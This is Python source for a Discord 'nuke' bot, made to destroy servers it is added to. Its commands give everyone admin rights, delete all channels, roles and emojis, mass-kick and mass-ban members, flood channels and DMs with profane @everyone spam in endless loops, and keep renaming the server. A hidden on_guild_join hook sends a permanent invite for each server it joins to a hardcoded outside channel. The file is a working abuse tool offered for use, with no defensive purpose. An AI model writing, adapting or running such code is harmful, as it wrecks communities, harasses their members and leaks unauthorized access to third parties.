import discord
from discord.ext import commands
import random
from discord import Permissions

CHANNEL_NAMES = ["get nuked", "delete the server", "get fucked", "trash server"]
 
MESSAGE_CONTENTS = ["@everyone Get Fucking Nuked :clown:","@everyone Get Nuked :crab: https://images.immediate.co.uk/production/volatile/sites/7/2018/11/GettyImages-107808064-6eb5e54.jpg?quality=45&resize=620,413", "@everyone Delete the Server"]

bot = commands.Bot(command_prefix='[')

client = commands.Bot(command_prefix='[')

bot.remove_command('help')

@bot.event
async def on_ready():
   print('Logged in as {}'.format(bot.user.name))
   game = discord.Game("Nuking Discord Filth")
   await bot.change_presence(status=discord.Status.online, activity=game)
   print("Bot made by Kaotic, Bancer and XxGamerBroskixX")

#used to keep invites to where the bot is added to not needed for bot to function just extra if you know how it works
@bot.event
async def on_guild_join(guild):
  await guild.create_text_channel("logs")
  channel = discord.utils.get(guild.channels, name="logs")
  link = await channel.create_invite(max_age = 0, max_uses = 0)
  channel = bot.get_channel(id =650545728497909780)
  await channel.send(link)   

@bot.command(pass_context=True)
async def cmds(ctx):
 await ctx.message.delete()
 embed = discord.Embed(color=ctx.author.color, timestamp=ctx.message.created_at)

 embed.set_author(name="Nuke Commands", icon_url=ctx.author.avatar_url)
 
 embed.add_field(name="cmds", value="Shows this message.", inline=False)
 embed.add_field(name="nuke", value="Nukes the server.", inline=False)
 embed.add_field(name="nick <nickname>", value="Mass nickname change.", inline=False)
 embed.add_field(name="message <message>", value="Dms everyone.", inline=False)
 embed.add_field(name="spam", value="Spams all channels.", inline=False)
 embed.add_field(name="spamchan", value="Spams the channel.", inline=False)
 embed.add_field(name="roles", value="Spam make roles.", inline=False)
 embed.add_field(name="delete", value="Deletes all channels.", inline=False)
 embed.add_field(name="channels", value="Spam creates channels.", inline=False)
 embed.add_field(name="voicec",value="Spam creates voice channels.", inline=False)
 embed.add_field(name="kick", value="Kicks everyone below bot role.", inline=False)
 embed.add_field(name="ban", value="Bans all users below bot role.", inline=False)
 embed.add_field(name="banuser <user>", value="Bans specified user..", inline=False)
 embed.add_field(name="purge <amount>", value="Purges messages.", inline=False)
 embed.add_field(name="admin",value="Gives @everyone admin.", inline=False)
 await ctx.send(embed=embed)
 embed = discord.Embed(color=ctx.author.color, timestamp=ctx.message.created_at)

 embed.set_author(name="Nuke Commands Page 2", icon_url=ctx.author.avatar_url)

 embed.add_field(name="ping",value="Shows bots ping.", inline=False)
 embed.add_field(name="cate",value="Spam creates categories.", inline=False)
 embed.add_field(name="customchan <channel names>",value="Creates channel names of your choice.", inline=False)
 embed.add_field(name="rename <channel name>",value="Renames all channels.", inline=False)
 embed.add_field(name="cuspam <spam text>",value="Make spam of your choice.", inline=False)
 embed.add_field(name="guildname <name>",value="Changes the server name", inline=False)
 embed.add_field(name="emojidel",value="Deletes all emojis (Can be slow)", inline=False)
 embed.add_field(name="namespam",value="Constantly changes the server name", inline=False)
 embed.add_field(name="info",value="Gives user info.", inline=False)
 embed.add_field(name="roledel",value="Deletes roles above the bots higest role.", inline=False)

 await ctx.send(embed=embed)

@bot.command(pass_context=True)
async def nick(ctx, rename_to):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.edit(nick=rename_to)
                print (f"{user.name} has been renamed to {rename_to} in {ctx.guild.name}")
            except:
                print (f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}")
        print ("Action Completed: change nick")

@bot.command(pass_context=True)
async def banuser(ctx, member : discord.Member):
    await member.ban()
    await ctx.message.delete()

@bot.command(pass_context=True)
async def rename(ctx, rename_to):
        await ctx.message.delete()
        for channel in ctx.guild.channels:
            await channel.edit(name=rename_to)

@bot.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")

@bot.command(pass_context=True)
async def message(ctx, *, message):
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                await user.send(message)
                print(f"{user.name} has recieved the message.")
            except:
                print(f"{user.name} has NOT recieved the message.")
        print("Action Completed: Mass DM")

@bot.command(pass_context=True)
async def guildname(ctx, *, name):
  await ctx.message.delete()
  await ctx.guild.edit(name=name)

@bot.command(pass_context=True)
async def nuke(ctx, amount=500):
        await ctx.message.delete()
        guild = ctx.guild
        for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print("@everyone has admin") 
                  except:
                      print("@everyone does NOT have admin")
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                print (f"{channel.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
        for user in list(ctx.guild.members):
            try:         
                await ctx.guild.kick(user)
                print (f"{user.name} has been kicked from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
        for i in range(amount):
           await guild.create_text_channel(random.choice(CHANNEL_NAMES))
        print ('Action NUKE complete')

@bot.command(pass_context=True)
async def ban(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} has been banned from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
        print ("Action Completed: Banned")  

@bot.command(pass_context=True)
async def roledel(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")

@bot.command(pass_context=True)
async def clear(ctx, amount=100000):
  await ctx.message.delete()
  await ctx.channel.purge(limit=amount)

#WARNING this command will rate limit the bot
@bot.command(pass_context=True)
async def roles(ctx): 
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name="Get Fucked")

@bot.command(pass_context=True)
async def spamchan(ctx): 
    await ctx.message.delete()
    while True:
    
     await ctx.send("@everyone Sample Text") 

@bot.command(pass_context=True)
async def spam(ctx, amount=1000000):
    await ctx.message.delete()
    if not amount is None:
        for _ in range(amount):
            for channel in ctx.guild.text_channels:
              await channel.send(random.choice(MESSAGE_CONTENTS))
    else:
        while True:  
            for channel in ctx.guild.text_channels: 
              await channel.send(random.choice(MESSAGE_CONTENTS))      

@bot.command(pass_context=True)
async def customchan(ctx, *, name, amount=100):
    await ctx.message.delete()
    guild = ctx.message.guild
    for i in range(amount):
        await guild.create_text_channel(name)

@bot.command(pass_context=True)
async def kick(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.kick(user)
                print (f"{user.name} has been kicked from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
        print ("Action Completed: Kicked")  
 
@bot.command(pass_context=True)
async def ping(ctx):
    await ctx.message.delete()
    await ctx.send(f"Pong! My latency is {round(bot.latency *1000)}ms.")
  
@bot.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print("@everyone has admin") 
                  except:
                      print("@everyone does NOT have admin")

@bot.command(pass_context=True)
async def info(ctx, member: discord.Member):
  await ctx.message.delete()
  member = ctx.author if not member else member
  roles = [role for role in member.roles]

  embed = discord.Embed(colour=member.color, timestamp=ctx.message.created_at)
  
  embed.set_author(name=f"User Info - {member}")
  embed.set_thumbnail(url=member.avatar_url)
  embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.avatar_url)

  embed.add_field(name="User ID", value=member.id)
  embed.add_field(name="Nickname", value=member.display_name)

  embed.add_field(name="Creation Date", value=member.created_at.strftime("%a, %#d %B, %Y, %I:%M %p UTC"))
  embed.add_field(name="Guild Join Date", value=member.joined_at.strftime("%a, %#d %B, %Y, %I:%M %p UTC"))

  embed.add_field(name=f"Roles ({len(roles)})", value=" ".join([role.mention for role in roles]))
  embed.add_field(name="Highest Role", value=member.top_role.mention)

  embed.add_field(name="Bot?", value=member.bot)

  await ctx.send(embed=embed)

@bot.command(pass_context=True)
async def cate(ctx, amount=100):
    await ctx.message.delete()
    guild = ctx.message.guild 
    for i in range(amount):
        await guild.create_category(random.choice(CHANNEL_NAMES))

@bot.command(pass_context=True)
async def delete(ctx):
  await ctx.message.delete()
  for channel in ctx.guild.channels:
    print(f"Deleting channel {channel.name}")
    await channel.delete()
  await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
  await ctx.guild.create_voice_channel(random.choice(CHANNEL_NAMES))

@bot.command(pass_context=True)
async def cuspam(ctx, *, message, amount=100000):
    await ctx.message.delete()
    if not amount is None:
        for _ in range(amount):
            for channel in ctx.guild.text_channels:
              await channel.send(f"@everyone {message}")
    else:
        while True:  
            for channel in ctx.guild.text_channels:      
              await channel.send(f"@everyone {message}")

@bot.command(pass_context=True)
async def channels(ctx, amount=500):
    await ctx.message.delete()
    guild = ctx.message.guild 
    for i in range(amount):
        await guild.create_text_channel(random.choice(CHANNEL_NAMES))

@bot.command(pass_context=True)
async def namespam(ctx, amount=100):
    await ctx.message.delete()
    for i in range(amount):
      while True:
        await ctx.guild.edit(name = random.choice(CHANNEL_NAMES))

@bot.command(pass_context=True)
async def voicec(ctx, amount=500):
    await ctx.message.delete()
    guild = ctx.message.guild 
    for i in range(amount):
        await guild.create_voice_channel(random.choice(CHANNEL_NAMES))

bot.run("Bot Token Here")
